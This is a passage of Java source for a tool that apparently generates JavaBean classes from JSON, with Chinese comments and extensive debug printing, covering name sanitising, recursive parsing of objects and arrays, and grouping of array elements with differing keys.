
			if (chs[0] >= 'A' && chs[0] <= 'Z') {
				chs[0] = (char) (chs[0] + 32);
			}
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.append(chs[0]);
			for (int i = 1; i < chs.length; i++) {
				if (chs[i] == '_') {
					continue;
				}
				if (chs[i - 1] == '_') {
					if (chs[i] >= 'a' && chs[i] <= 'z') {
						stringBuilder.append((char) (chs[i] - 32));
					} else {
						stringBuilder.append(chs[i]);
					}
				} else {
					stringBuilder.append(chs[i]);
				}
			}

			return stringBuilder.toString();
		}
	}

	public static String fixedName_Json2Bean(String originName) {

		if (originName == null) {
			return originName;
		}
		String oldName = new String(originName);
		String nodeName = originName;

		// nodeName.get(0)=View_font-size-editor 在 .gv 文件中 不能以 - 命名变量
		if (nodeName.contains("-")) {
			nodeName = nodeName.replaceAll("-", "_");
		}

		if (nodeName.contains("!")) {
			nodeName = nodeName.replaceAll("!", "_");
		}
		if (nodeName.contains("+")) {
			nodeName = nodeName.replace("+", "_");
		}

		if (nodeName.contains("/")) {
			nodeName = nodeName.replace("/", "_");
		}

		if (nodeName.contains("\\")) {
			nodeName = nodeName.replace("\\", "_");
		}

		if (nodeName.contains("%")) {
			nodeName = nodeName.replace("%", "_");
		}

		if (nodeName.contains("$")) {
			nodeName = nodeName.replace("$", "_");
		}

		if (nodeName.contains(".")) {
			nodeName = nodeName.replace(".", "_");
		}

		if (nodeName.contains("___")) {
			nodeName = nodeName.replaceAll("___", "_");
		}

		if (nodeName.contains("__")) {
			nodeName = nodeName.replaceAll("__", "_");
		}

		nodeName = nodeName.trim();

		String firstChar = nodeName.substring(0, 1);
		String secondChar = nodeName.replaceAll("_", "").trim();
		if (isNumeric(firstChar) || "".equals(secondChar)) {
			nodeName = "Z_" + getTimeStampLong() + "_" + nodeName;
		}
		System.out.println("oldName = " + oldName + "  newName = " + nodeName);
		return nodeName;

	}

	static volatile String returnString = "";

	static class Json2Bean {
		public String json;
		public static JsonParse jsonParse;
		public String name;
		public static NameGenerator nameGeneration;
		public static BeanGenerator generationBean;
		private ArrayList<ProperityItem> arrList;
		public String fatherName;

		@Override
		public String toString() {
			System.out.println("============== 打印 JavaBean: " + this.name + " 开始==============");
			int index = 0;
			for (ProperityItem item : arrList) {

				System.out.println("index=" + index + "  item=" + item);
				index++;
			}
			System.out.println("============== 打印 JavaBean: " + this.name + " 结束==============");
			return "this.name=" + this.name + "   this.fatherName=" + this.fatherName;
		}

		public Json2Bean(String json, String name, String fatherName, NameGenerator nameGeneration, JsonParse jsonParse,
						 BeanGenerator generationBean) {
			this.json = json;
			this.name = fixedName_Json2Bean(name);
			this.nameGeneration = nameGeneration;
			this.jsonParse = jsonParse;
			this.fatherName = fatherName;
			this.generationBean = generationBean;
			arrList = new ArrayList<ProperityItem>();
			// ProperityItem(String ownnerClassName, String properityName, String TypeName,
			// String refClassName)
			// 类本身 所添加的 项
			System.out.println(" 新建Bean类 X1  = " + this.name);
			if (this.fatherName != null) {
				this.fatherName = filter(this.fatherName);
			}

			if (this.name != null) {
				this.name = filter(this.name);
			}

			while (this.fatherName != null && this.fatherName.contains(" ")) {
				this.fatherName = this.fatherName.replaceAll(" ", "");
			}

			while (this.name != null && this.name.contains(" ")) {
				this.name = this.name.replaceAll(" ", "");
			}

			arrList.add(new ProperityItem(null, this.name, "Class", this.fatherName)); // 类创建的Bean 所以该处 不可能 产生
			// make-> 4 refClassName=B properityName=topic
			System.out.println(" 新建Bean类 X2  = " + this.name);
		}

		public static String filter(String content) {
			if (content != null && content.length() > 0) {
				char[] contentCharArr = content.toCharArray();
				for (int i = 0; i < contentCharArr.length; i++) {
					if (contentCharArr[i] < 0x20 || contentCharArr[i] == 0x7F) {
						contentCharArr[i] = 0x20;
					}
				}
				return new String(contentCharArr);
			}
			return "";
		}

		@SuppressWarnings("unchecked")
		public String execute() {
			String curRentName = "";
			//
			try {
				if (this.name != null) {
					curRentName = this.name;
					System.out.println("开始解析Bean类: this.name  " + this.name + "  name =" + name);
					System.out.println("zukgit4_1_1_非空  this.name :" + this.name + "  name =" + name + " curRentName ="
							+ curRentName);

				} else {
					System.out.println("zukgit4_1_2 空  this.name :" + this.name + "  name =" + name + " curRentName ="
							+ curRentName);
				}
				// zukgit2 json ={"source":[],"abstract":[],"title":[[0,4]]}
				System.out.println("zukgit2  json =" + json);
				// zukgit2 json
				// =[[[{"name":"xm1","age":19},{"name":"[xm2","age":19},{"name":"{xm3","age":19}],[{"name":"[[xm4","age":19},{"name":"{{xm5","age":19}]],[[{"name":"xm6","age":19},{"name":"xm7","age":19}],[{"name":"xm8","age":19}]]]
				if (json.startsWith("{}")) { // 为空{} 的对象 创建 Bean AA
					System.out.println("zukgit6_1  ");
					parseMap();
					HashMap curMap = new HashMap();
					arrList.sort(new Comparator<ProperityItem>() {
						@Override
						public int compare(ProperityItem o1, ProperityItem o2) {

							if (o1.isClassList && o2.isBaseList) { // 【类集合】大于【基础属性集合】
								return -1;
							} else if (o1.isClassType && o2.isBaseList) { // 【类基础】大于【基础属性集合】
								return -1;
							} else if (o1.isList && !o2.isList) { // 【列表】大于【非列表】
								return -1;
							} else if (o1.isClassType && o2.isBaseType) {
								return -1;
							} else {
								return 0;
							}

						}
					});

					curMap.put(this.name, arrList);
					Rule17_arrMapList.add(curMap);
					return null;

				} else if (json.startsWith("{")) {
					System.out.println("zukgit3   ");
					parseMap();
					System.out.println("zukgit3_1  ");
					HashMap curMap = new HashMap();
					// zukgit2 json ={"source":[],"abstract":[],"title":[[0,4]]}
					arrList.sort(new Comparator<ProperityItem>() {
						@Override
						public int compare(ProperityItem o1, ProperityItem o2) {

							if (o1.isClassList && o2.isBaseList) { // 【类集合】大于【基础属性集合】
								return -1;
							} else if (o1.isClassType && o2.isBaseList) { // 【类基础】大于【基础属性集合】
								return -1;
							} else if (o1.isList && !o2.isList) { // 【列表】大于【非列表】
								return -1;
							} else if (o1.isClassType && o2.isBaseType) {
								return -1;
							} else {
								return 1;
							}

						}
					});
					curMap.put(this.name, arrList);
					Rule17_arrMapList.add(curMap);
					return null;
				} else if (json.startsWith("[]")) { // 如果当前的 对象为 [] 即为空
					// 获取这个
					System.out.println("AA1 json= " + json + " properItem=" + this.toString()); // [对象1, 对象2]
					return "Object";
				} else if (json.startsWith("[") && json.length() > 2) { // ["小康","社会"]
					System.out.println("zukgit4  "); // [对象1, 对象2]
					String clz = parseArray(); // 解析对象 返回 List<Onjext> xxx 等等
					returnString = new String(clz) + this.fatherName;
					// father_name
					System.out.println("zukgitx8  ");
					if (this.fatherName != null && this.fatherName.equals("RootBean")) { // 继续点
// RootBean_Arr Clz = List<A_B_C>  name= null  fathername=RootBean curRentName=
						System.out.println("ZZXX RootBean_Arr Clz = " + clz + "   name= " + name + "  fathername="
								+ this.fatherName + " curRentName=" + curRentName);
					}
					if (name == null && curRentName.trim().isEmpty()) {
						System.out.println("zukgit4_1_2_空  this.name :" + this.name + "  name =" + name
								+ " curRentName =" + curRentName + " clz=" + clz + "  不会执行 writeList(clz) 方法了  操蛋！");
						System.out.println("zukgitx7  ");
						return clz;
					} else {

						System.out.println("zukgit4_1_1_非空  this.name :" + this.name + "  name =" + name
								+ " curRentName =" + curRentName + " clz=" + clz);
					}

//                    Line 214: zukgit4_1  clz =List<String>name =null
//                    Line 299: zukgit4_1  clz =List<Integer>name =null
//                    Line 301: zukgit4_1  clz =List<>name =null
//                    Line 416: zukgit4_1  clz =List<D>name =null
//                    Line 421: zukgit4_1  clz =List<A_B_C>name =null
//                    Line 467: zukgit4_1  clz =List<E>name =null
					System.out.println("zukgitx6  ");
					System.out.println("zukgit4_2  name != null   非空的情况才会在这里 在这里书写 writeList  zzj");
					generationBean.writeList(clz);
					HashMap curMap = new HashMap();
					if (name != null) {
						System.out.println("zukgitx5  ");
						arrList.sort(new Comparator<ProperityItem>() {
							@Override
							public int compare(ProperityItem o1, ProperityItem o2) {

								if (o1.isClassList && o2.isBaseList) { // 【类集合】大于【基础属性集合】
									return -1;
								} else if (o1.isClassType && o2.isBaseList) { // 【类基础】大于【基础属性集合】
									return -1;
								} else if (o1.isList && !o2.isList) { // 【列表】大于【非列表】
									return -1;
								} else if (o1.isClassType && o2.isBaseType) {
									return -1;
								} else {
									return 1;
								}

							}
						});
						curMap.put(name, arrList);
						Rule17_arrMapList.add(curMap);
						System.out.println("zukgitx4  ");
						return clz;
					} else if (curRentName != null && !curRentName.trim().isEmpty()) {

						arrList.sort(new Comparator<ProperityItem>() {
							@Override
							public int compare(ProperityItem o1, ProperityItem o2) {

								if (o1.isClassList && o2.isBaseList) { // 【类集合】大于【基础属性集合】
									return -1;
								} else if (o1.isClassType && o2.isBaseList) { // 【类基础】大于【基础属性集合】
									return -1;
								} else if (o1.isList && !o2.isList) { // 【列表】大于【非列表】
									return -1;
								} else if (o1.isClassType && o2.isBaseType) {
									return -1;
								} else {
									return 1;
								}

							}
						});
						curMap.put(curRentName, arrList);
						Rule17_arrMapList.add(curMap);
						System.out.println("zukgitx3  ");
						return clz;

					} else {
						System.out.println("zukgitx2  ");
						return clz;
					}
				} else {
					System.out.println("zukgitx1  ");
					System.out.println("开始解析Bean类:" + this.name + " 失败 ");
				}
				return null;
			} catch (Exception e) {
				e.fillInStackTrace();
				System.out.println(" 发生异常 ！ Exception =");
				e.printStackTrace();

			} finally {
				return curRentName;
			}
		}

		private void parseMap() throws IOException {
			// parseMap() json={"source":[],"abstract":[],"title":[[0,4]]}
			Map<String, Object> map = jsonParse.toMap(json);
			System.out.println(" parseMap() json=" + json);
			Iterator<Map.Entry<String, Object>> itr = map.entrySet().iterator();
			String childName_arr = null;
			while (itr.hasNext()) {
				Map.Entry<String, Object> entry = itr.next();
				String k = entry.getKey();
				Object v = entry.getValue();
				if (v == null || v.toString().equals("[]")) {
					// old 逻辑: 如果发现 当前的列表为空的话 就从 属性map 中删除它
					// new 逻辑: 如果发现 当前的列表为空的话 就设置它的属性是 List<Object> null 不需要创建类对象 但需要有 这个 Property
					System.out.println(
							"AA  k =" + k + "   v=" + v + " this.toString()" + this.toString() + "   json=" + json);
//  AA  k =abstract   v=[] this.toString()this.name=Highlight   this.fatherName=B   json={"source":[],"abstract":[],"title":[[0,4]]}
					entry.setValue("List<Object>");

//============== 打印 JavaBean: Highlight 开始==============
//index=0  item=【 ownnerClassName=null  properityName=Highlight TypeName=Class refClassName=B  isBaseType=false  isClassType=true  isList=false baseListCount=0 classListCount=0】
//============== 打印 JavaBean: Highlight 结束==============
//  AA  k =image_list   v=[] this.toString()this.name=B   this.fatherName=null   json=
					// itr.remove(); ProperityItem(String ownnerClassName, String properityName,
					// String TypeName, String refClassName)

// AA  k =source   v=[] this.toString()this.name=Highlight   this.fatherName=B   json={"source":[],"abstract":[],"title":[[0,4]]}
					String ownerClassName = "";
					if (this.fatherName != null && this.name != null) {
						ownerClassName = this.name;
					} else if (this.name == null && this.fatherName != null) {
						ownerClassName = this.fatherName;

					} else if (this.name != null && this.fatherName == null) {

						ownerClassName = this.name;
					} else {
						ownerClassName = null;
					}
					ProperityItem item = new ProperityItem(ownerClassName, k, entry.getValue() + "",
							this.name == null ? this.fatherName : null);
					arrList.add(item);
					continue;
				}
				if (v instanceof Integer) {
					entry.setValue("Integer");
				} else if (v instanceof BigDecimal) {
					entry.setValue("Double");
				} else if (v instanceof String) {
					entry.setValue("String");
				} else {
					String childJson = v.toString(); // key 是 对象中 非基础数据类型 value 可能还是空 需要设置
					if (childJson.endsWith("{}")) { // 空的对象 那么 Object

						String childName = nameGeneration.formatName(k); // nima
						entry.setValue(childName);
						String key = entry.getKey();
						String valueName = new Json2Bean(childJson, childName, this.name, nameGeneration, jsonParse,
								generationBean).execute();
						// entry.setValue("valueName");
						System.out.println("zchildJson=" + childJson + "  valueName=" + valueName + "  key=" + key
								+ "  childName=" + childName + "    this.name=" + this.name);
					} else if (childJson.startsWith("{")) {

						String childName = nameGeneration.formatName(k);
						entry.setValue(childName);
						new Json2Bean(childJson, childName, this.name, nameGeneration, jsonParse, generationBean)
								.execute();
					} else if (childJson.startsWith("[]")) { // 是空的对象的话
						String childName = nameGeneration.formatName(k); // 产生名字
						entry.setValue(childName);
						new Json2Bean(childJson, childName, this.name, nameGeneration, jsonParse, generationBean)
								.execute();

					} else if (childJson.startsWith("[")) {

						childName_arr = new Json2Bean(childJson, null, this.name, nameGeneration, jsonParse,
								generationBean).execute();

						if (childName_arr == null || childName_arr.trim().equals("")) {

							if (returnString != null && !returnString.trim().isEmpty()
									&& returnString.contains(this.name)) {
								String item = new String(returnString);
								item = item.replaceAll(this.name, "");
								childName_arr = item;
							}
						}
						// List<A_B_C> 会走这里 zzj 继续点
						if (((String) k).equals("data")) {
							System.out.println("ZZXX childJson.startsWith parseMap    name[fatherName]=" + name
									+ "    this.name[fatherName]=" + this.name + " key =" + k + "   childName[Clz]="
									+ childName_arr);
							// childJson.startsWith parseMap name=RootBean this.name=RootBean key =data
							// childName=空 这里应该返回 List<A_B_C>
						}

						entry.setValue(childName_arr);

					} else {
						entry.setValue("String");
					}

				}
				// // ProperityItem(String ownnerClassName, String properityName, String
				// TypeName, String refClassName)
				arrList.add(new ProperityItem(this.name, k, entry.getValue() + "",
						this.name == null ? this.fatherName : null));
//         ProperityItem(String ownnerClassName, String properityName, String TypeName, String refClassName)
				// zkey = topic zvalue = Topic this.fatherName=B childName = null
				// this.name=Extra
				// zkey = topic_2048 zvalue = Topic_2048 this.fatherName=B childName = null
				// this.name=Extra
				System.out.println(" zkey = " + k + " zvalue = " + entry.getValue() + " this.fatherName="
						+ this.fatherName + " childName = " + childName_arr + "  this.name=" + this.name);

			}

			System.out.println("writeBean  Aname =" + name);
			generationBean.writeBean(name, map);

		}

		public static boolean isContainChinese(String str) {
			Pattern p = Pattern.compile("[\u4e00-\u9fa5]");
			Matcher m = p.matcher(str);
			if (m.find()) {
				return true;
			}
			return false;
		}

		private String parseArray() throws IOException {
			List<Object> list = jsonParse.toArray(json); // ["小康","社会"]
			if (list == null || list.size() == 0) {
				return null;
			}

			Object firstObj = list.get(0);
			System.out.println("Zukgit firstObj =  " + firstObj.toString());

			if (firstObj instanceof Integer) {
				for (int i = 1; i < list.size(); i++) {
					Object v = list.get(i);
					if (v instanceof BigDecimal) {
						System.out.println(" childName 4=  List<Double>");
						// returnStr = "List<Double>";
						return "List<Double>";
					}
				}
				System.out.println(" childName 5 =  List<Integer>");
				// returnStr = "List<Double>";
				return "List<Integer>";
			} else if (firstObj instanceof BigDecimal) {
				System.out.println(" childName 6=  List<Double>");
				// returnStr = "List<Double>";
				return "List<Double>";

			} else if (firstObj instanceof String) {
				System.out.println(" childName 7=  List<String>");
				// returnStr = "List<Double>";
				return "List<String>";
			}

			if (!firstObj.toString().startsWith("{") && !firstObj.toString().startsWith("[")) {

				return "List<String>";
			}

			String childName = "";
			String arrReturenString = "";
			// Object v = list.get(0); // 只拿取 [{1},{2},{3} ....] 只拿取第一个 对象 但往往有些Json的 第一个位置
			// 第二个位置 第三个位置 往往是不同的对象
			// 在这里要判断 它的数组里面的属性是否是相同的 相同的话 取一个分析 就可以 数组对象属性不同的话 那么就要每个拿出来分析 并新创建对象

			List<Object> diffObjectInArr = checkObjectSame(list); //
			System.out.println("diffObjectInArr  =  " + diffObjectInArr.size());
			String returnStr = "";
			if (diffObjectInArr != null) {
				if (diffObjectInArr.size() == 1) {
					Object v = diffObjectInArr.get(0);
					if (v instanceof Integer) {
						for (int i = 1; i < list.size(); i++) {
							v = list.get(i);
							if (v instanceof BigDecimal) {
								System.out.println(" childName 8=  List<Double>");
								returnStr = "List<Double>";
								return "List<Double>";
							}
						}
						System.out.println(" childName 99 =  List<Integer>");
						returnStr = "List<Double>";
						return "List<Integer>";
					} else if (v instanceof BigDecimal) {
						System.out.println(" childName 10=  List<Double>");
						returnStr = "List<Double>";
						return "List<Double>";

					} else if (v instanceof String) {
						System.out.println(" childName 11=  List<String>");
						returnStr = "List<Double>";
						return "List<String>";
					} else {
						String childJson = v.toString();

						if (childJson.startsWith("{}")) {
							return "List<Object>";
						} else if (childJson.startsWith("{")) {
							childName = nameGeneration.nextName();

							new Json2Bean(childJson, childName, name, nameGeneration, jsonParse, generationBean)
									.execute();
							System.out.println(" childName  12= " + childName);
							// arrList.add("List<" + childName + ">");
							returnStr = "List<" + childName + ">";
							return "List<" + childName + ">";
						} else if (childJson.startsWith("[")) {
							childName = new Json2Bean(childJson, null, this.name, nameGeneration, jsonParse,
									generationBean).execute();
							System.out.println(" childName 13= " + childName); // 这里返回为空 curRentName = clz=List<>
							// arrList.add("List<" + childName + ">");
							if (childName == null || childName.trim().isEmpty() || childName.trim().equals("null")) {
								childName = "Object";
							}
							returnStr = "List<" + childName + ">";
							return "List<" + childName + ">";

						} else {
							System.out.println(" childName 14= " + childName);
							// arrList.add("List<String>" + childName);
							returnStr = "List<" + childName + ">";
							return "List<String>";
						}

					}
				} else {
					int ZCount = 0;
//  对于多个 数组中 多个   Object的 处理

					for (Object object : diffObjectInArr) {

//                        String childJson = object.toString();
//                        String className = nameGeneration.nextName();
//
//                        System.out.println("ZCount=" + ZCount + " iffObjectInArr.size =" + diffObjectInArr.size() + " this.name=" + name + "    Zukgit  childName = " + childName + " className =" + className + " childJson=" + childJson);
//                        new Json2Bean(childJson, className, this.name, nameGeneration, jsonParse, generationBean).execute();
//                        System.out.println("ZCount=" + ZCount + "   Zukgit  childJson = " + childJson);
//                        ZCount++;

						String childJson = object.toString();
						System.out.println("ZCount = " + ZCount + "   Zukgit_Object  childJson= " + childJson);
						System.out.println(" zukgit childJson = " + childJson);

						if (childJson.startsWith("{}")) {
							arrReturenString = "List<Object>";
						} else if (childJson.startsWith("{")) {
							childName = nameGeneration.nextName();

							new Json2Bean(childJson, childName, name, nameGeneration, jsonParse, generationBean)
									.execute();

							// arrList.add("List<" + childName + ">");
							curIndexStr = curIndexStr + "\\n" + childName; // /nA[][][][]
							int diffObjectSize = diffObjectInArr.size();
							int indexArrSize = classArr.size(); // <A___B___C>/nA[][][][]/nB[][][]/nC[][][] 的位置不对
							if (diffObjectSize == indexArrSize) {
								ArrayList<Integer> curIndexArr = classArr.get(ZCount);
								for (Integer intx : curIndexArr) {
									curIndexStr = curIndexStr + "[" + intx + "]";
								}
							}

							// A___B___C ==> A[1]___B[2]___C[3]
							arrReturenString = arrReturenString + childName + "___"; // <A___B___C>/nA[][][][]/nB[][][]/nC[][][]
							System.out.println(
									"diffObjectInArr.size" + diffObjectInArr.size() + "   childName 1= " + childName
											+ "  arrReturenString" + arrReturenString + "    childJson= " + childJson);

//                            diffObjectInArr.size3   childName 1= A  arrReturenStringA___
//                            diffObjectInArr.size3   childName 1= B  arrReturenStringA___B___
//                            diffObjectInArr.size3   childName 1= C  arrReturenStringA___B___C___

							// return "List<" + childName + ">"; // 这里没有返回 "List<" + childName + ">"; 导致 程序中
							// 缺 List<>
						} else if (childJson.startsWith("[")) {
							childName = new Json2Bean(childJson, null, this.name, nameGeneration, jsonParse,
									generationBean).execute();
							System.out.println(" childName 2= " + childName);
							// arrList.add("List<" + childName + ">");
							arrReturenString = "【" + childName + "】" + arrReturenString;
							// return "List<" + childName + ">";

						} else {
							System.out.println(" childName 3= " + childName);
							// arrList.add("List<String>" + childName);
							arrReturenString = "【" + childName + "】";
							return "List<String>";
						}
						ZCount++;
					}
					classArr.clear();
				}
			}

			while (arrReturenString.endsWith("_")) {
				arrReturenString = arrReturenString.substring(0, arrReturenString.length() - 1);

			}
			if (arrReturenString.trim().isEmpty()) {
				arrReturenString = "Object";
			}
			String endResult = "List<" + arrReturenString + ">";
			if (!curIndexStr.trim().isEmpty()) {
				endResult = endResult + curIndexStr;
			}

			// endResult=List<【C】【B】【A】>\nA[1][2]\n[3][4][5]\n[6][7][8]
			System.out.println("zendResult=" + endResult + "arrReturenString =" + arrReturenString
					+ " nima ######################");
			return endResult;
		}

		static String curIndexStr = ""; // \nA[1][2]\nB[3]\nC[4]

		static List<Object> checkObjectSame(List<Object> srcList) { // 对象和对象相同
			// 来到这里的都是 [{},{},{}] 样式的数据

			boolean isDiffClass = false;
			List<Object> temp = new ArrayList<Object>();
			int length = srcList.size();
			if (length == 0) {
				return null;
			}
			int index_y = 0;
			System.out.println("=========== Json 原始长度 srcList.length = " + srcList.size() + "===========Begin ");
			for (Object object : srcList) {
				System.out.println("index =" + index_y + "  object =" + object.toString());
				index_y++;

			}
			System.out.println("=========== Json 原始长度 srcList.length = " + srcList.size() + "===========End ");
			Object firstObject = srcList.get(0);
			HashSet<Set<String>> diffObjSet = new HashSet<Set<String>>();
			ArrayList<Integer> indexList = new ArrayList<Integer>();
			for (int index = 0; index < length; index++) {
				Object curObject = srcList.get(index);
				if (curObject instanceof JSONObject && firstObject instanceof JSONObject) {
					Set<String> curKeySet = ((JSONObject) curObject).keySet();
					Set<String> firstKeySet = ((JSONObject) firstObject).keySet();

					if (!firstKeySet.equals(curKeySet)) {

						isDiffClass = true;
					} else {
						isDiffClass = false;
					}

					// 判断 数据列表中 有多少个 Object 的 缺斤少两的 同一归为一个Object
//                    if (curKeySet.equals(firstKeySet)) {
//                        if (!diffObjSet.contains(curKeySet)) {
//                            indexList.add(index);
//                            System.out.println("当前 index = " + index + "    相同的 KeySet 键值集合  ");
//                            diffObjSet.add(curKeySet);  // 如果 相同 则 放入
//                        }
//                    } else {
//                        if (!diffObjSet.contains(curKeySet) && checkMaxValue(diffObjSet, curKeySet)) {
//                            diffObjSet.add(curKeySet);
//                            indexList.add(index);
//                            System.out.println("当前 index = " + index + "    不相同的 KeySet 键值集合  ");
//                        }
//                        System.out.println("难道这里会打印！ ");
//                    }

				} else {

					System.out.println(
							"当前 index = " + index + "     不能转为  JSONObject?  curObject= " + curObject.toString());
				}

			}
			System.out.println("isDiffClass = " + isDiffClass);

			if (!isDiffClass) {
				temp.add(srcList.get(0));
				return temp;

			}
			// 处理 那些 不同 Object [{A:1,B:2},{C:3,D:4}......] 样式的数据
			temp = toCheckDiff(srcList);

			return temp;
		}

		static ArrayList<ArrayList<Integer>> classArr = new ArrayList<ArrayList<Integer>>();

		@SuppressWarnings("unchecked")
		static List<Object> toCheckDiff(List<Object> srcList) {
			List<Object> temp = new ArrayList<Object>();
			int length = srcList.size();
			// 获取到 所有的 Key 以及 所有的Value
//   两个集合的交集大于 当前size的一半  那么 就认为 它们是同一个类
			// 两次 循环 找出 和自己 相似的那个 集合 然后 把 它们的 索引放到一起
			Set<String> allSetKey = new HashSet<String>();
			Map<Integer, Integer> intMap = new HashMap<Integer, Integer>();
			int classCategory = 0;
			// 【1,3】 【1,4】 【1,5】 【1,6】
			// 【2,7】【2，8】
			// 【3,9】【3，10】

			for (int i = 0; i < length; i++) {
				JSONObject curObjectA = (JSONObject) srcList.get(i);
				allSetKey.addAll(curObjectA.keySet());
				for (int j = 0; j < length; j++) {
					if (i == j) {
						continue;
					}
					JSONObject curObjectB = (JSONObject) srcList.get(j);
					Set<String> aSet = new HashSet<String>(curObjectA.keySet());
					Set<String> bSet = new HashSet<String>(curObjectB.keySet());
					int aSize = aSet.size();
					int bSize = aSet.size();
					if (aSet.size() >= bSet.size()) { // 总是以大Set去 交集 小的Set
						aSet.retainAll(bSet);
						if (aSet.size() > (aSize / 2)) {
							intMap.put(i, j);
						}
					} else {
						bSet.retainAll(aSet);
						if (bSet.size() > (bSize / 2)) {
							intMap.put(i, j);
						}
					}
				}
			}

			Map.Entry<Integer, Integer> entry;

			Iterator iterator = intMap.entrySet().iterator();

			int xIndex = 0;
			while (iterator.hasNext()) {
				entry = (Map.Entry<Integer, Integer>) iterator.next();
				Integer key = entry.getKey(); // Map的Value
				Integer value = entry.getValue(); // Map的Value
				System.out.println("【 key=" + key + "  value=" + value + "】");
				if (xIndex == 0) {
					ArrayList<Integer> arrItem = new ArrayList<Integer>();
					arrItem.add(key);
					arrItem.add(value);
					classArr.add(arrItem);
					xIndex++;
					continue;
				}

				ListIterator<ArrayList<Integer>> outArray = classArr.listIterator();
				// for(ArrayList<Integer> arrBean : classArr){
				while (outArray.hasNext()) {

					ArrayList<Integer> arrBean = (ArrayList<Integer>) outArray.next();
//                    for(Integer intIndex : arrBean){
//                        System.out.println("intIndex = "+ intIndex);
//
// if(arrBean.contains(key) || arrBean.contains(value) || intIndex == key || intIndex == value){
//                            arrBean.add(key);
//                            arrBean.add(value);
//                        }else{
//                            ArrayList<Integer> newItem = new  ArrayList<Integer>();
//                            newItem.add(key);
//                            newItem.add(value);
//     classArr.add(newItem);
//                        }
//

					// Iterator<Integer> iteratorInteger = arrBean.iterator();
					ListIterator<Integer> iteratorInteger = arrBean.listIterator();
					while (iteratorInteger.hasNext()) {
						Integer curInteger = iteratorInteger.next();
						System.out.println("curInteger  = " + curInteger);
						if (arrBean.contains(key) || arrBean.contains(value) || curInteger == key
								|| curInteger == value) {
							// 循环中 增加
							if (!arrBean.contains(key) && arrBean.contains(value)) {
								iteratorInteger.add(key);
								break;
							}
							if (!arrBean.contains(value) && arrBean.contains(key)) {
								iteratorInteger.add(value);
								break;
							}

						} else {

// 【 key=9  value=19】
//curInteger  = 1
//
//
//【 key=19  value=9】
// curInteger  = 1

							ArrayList<Integer> arrItemNew = new ArrayList<Integer>();
							if (key < value) {
								arrItemNew.add(key);
								arrItemNew.add(value);
							} else {
								arrItemNew.add(value);
								arrItemNew.add(key);
							}
							if (!classArr.contains(arrItemNew)) {
								outArray.add(arrItemNew);
								break;
							}
							continue;

						}
					}
					break;

				}
			}

// 没有包含索引的那个类 是单独的类
//  具有相同 Value , 以及 该Value 对应的 Key  为 相同的类
			System.out.println("classArr.size = " + classArr.size());

			for (int index_value = 0; index_value < classArr.size(); index_value++) {
				System.out.println("=============数组 ==" + index_value + " Begin=============");
				Collections.sort(classArr.get(index_value));
				for (Integer item : classArr.get(index_value)) {
					System.out.println("item = " + item);
				}
				System.out.println("=============数组 ==" + index_value + " End=============");
			}

			for (int y = 0; y < length; y++) {
				if (intMap.get(y) == null) { // 说明 该索引对应的 {} 为单独存在的 不与其他的项相同
					temp.add(srcList.get(y));
				}
// 存在相同的项的话  就从  classArr 中寻找那个 KeySet 最大的
			}

			List<Object> sameObjectMax = getSameObjectMax(srcList, classArr);

			for (int y = 0; y < length; y++) {
				if (intMap.get(y) == null) { // 说明 该索引对应的 {} 为单独存在的 不与其他的项相同
					// 往 ArrayList<ArrayList<Integer>> classArr 也 添加这个索引 单独在一个ArrayList
					ArrayList<Integer> newItem_alone = new ArrayList<Integer>();
					newItem_alone.add(y);
					classArr.add(newItem_alone);
				}
// 存在相同的项的话  就从  classArr 中寻找那个 KeySet 最大的
			}

			classArr.sort(new Comparator<ArrayList<Integer>>() {
				@Override
				public int compare(ArrayList<Integer> o1, ArrayList<Integer> o2) {
					int minIndexO1 = 0;
					int minIndexO2 = 0;

					for (int x = 0; x < o1.size(); x++) {
						int temp = o1.get(x);
						if (x == 0) {
							minIndexO1 = o1.get(x);
						}
						if (temp < minIndexO1) {
							minIndexO1 = temp;
						}
					}
					for (int x = 0; x < o2.size(); x++) {
						int temp = o2.get(x);
						if (x == 0) {
							minIndexO2 = o2.get(x);
						}
						if (temp < minIndexO2) {
							minIndexO2 = temp;
						}
					}

					if (minIndexO1 < minIndexO2) {
						return -1;
					} else {
						return 1;
					}
				}
			});
			if (sameObjectMax != null) {

				System.out.println("sameObjectMax.size = " + sameObjectMax.size());
				temp.addAll(sameObjectMax);
			}

//【 key=1  value=18】
//【 key=2  value=18】
//【 key=3  value=18】
//【 key=4  value=18】
//【 key=5  value=18】
//【 key=6  value=18】
//【 key=7  value=18】
//【 key=8  value=18】、
//【 key=10  value=18】
//【 key=11  value=18】
//【 key=12  value=18】
//【 key=13  value=18】
//【 key=14  value=18】
//【 key=15  value=18】
//【 key=16  value=18】
//【 key=17  value=18】
//【 key=18  value=17】
//
//【 key=9  value=19】
//【 key=19  value=9】
			return temp;
		}

		static List<Object> getSameObjectMax(List<Object> srcList, ArrayList<ArrayList<Integer>> classArr) {
			List<Object> itemList = new ArrayList<Object>();
			System.out
					.println("maxLenthObj= X2  classArr.size()=" + classArr.size() + " srcList.size" + srcList.size());
			for (int index_value = 0; index_value < classArr.size(); index_value++) {
				JSONObject maxLenthObj = null;
				System.out.println("maxLenthObj= X1");

				for (Integer index_value_y : classArr.get(index_value)) {
					if (maxLenthObj == null) {
						maxLenthObj = (JSONObject) srcList.get(classArr.get(index_value).get(0));
					}
					System.out.println("index_value:" + index_value + "    index_value_y=" + index_value_y);
					JSONObject currentObj = (JSONObject) srcList.get(index_value_y);
					if (currentObj == null) {
						System.out.println("尼玛 空 currentObj= " + currentObj);
						continue;
					}

					int curLength = currentObj.keySet().size();
					int maxLength = maxLenthObj.keySet().size();
					if (curLength >= maxLength) {
						maxLenthObj = currentObj;
					}

				}
				itemList.add(maxLenthObj);
				System.out.println("maxLenthObj= " + maxLenthObj);
			}
			System.out.println("maxLenthObj= X3");
			return itemList;
		}

		static boolean checkMaxValue(HashSet<Set<String>> hashset, Set<String> itemSet) {
			boolean flag = false;
			Iterator<Set<String>> it = hashset.iterator();
			while (it.hasNext()) {
				Set<String> curSet = it.next();
				// 如果当前 添加的到 hashset的 项 set<String> 包含 当前循环找到的 set<String> 那么删除 这个 当前循环到的
				// set<String>
				if (itemSet.containsAll(curSet)) {
					hashset.remove(curSet);
					flag = true;
				} else if (curSet.containsAll(itemSet)) { // 如果 添加的到 hashset的 已经有 item 完全 包含 那么就 不添加该项
					flag = false;
					return false;
				} else {
					// 【data[16] 有 60项 】 data[13]有 56项 但是 data[16] 的 60项中却没有 data[13] 中的 summary 这项
					// curSet.retainAll()
					// 那么 把当前的 扫描的 Item 和 当前参数的 Item 合并 并把 当前item 删除
